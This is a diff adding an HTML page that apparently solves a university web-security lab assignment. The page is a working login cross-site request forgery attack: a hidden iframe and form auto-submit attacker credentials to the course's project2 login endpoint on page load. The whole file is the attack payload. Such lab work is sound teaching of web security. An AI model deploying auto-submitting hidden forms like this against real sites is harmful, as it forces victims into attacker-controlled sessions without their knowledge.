@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+			<div style="display:none;">
+				<iframe name="hider"></iframe>
+
+				<form id="csrf_form" method="POST" action="http://cs558web.bu.edu/project2/login?csrfdefense=0&xssdefense=4" target="hider">
+					<input type="text" name="username" value="attacker" />
+					<input type="text" name="password" value="l33th4x" />
+					<input type="text" name="csrfdefense" value="0" />
+					<input type="text" name="xssdefense" value="4" />
+				</form>
+
+				<script>
+				document.getElementById("csrf_form").submit();
+				</script>
+			</div>
+	</head>
+</html>
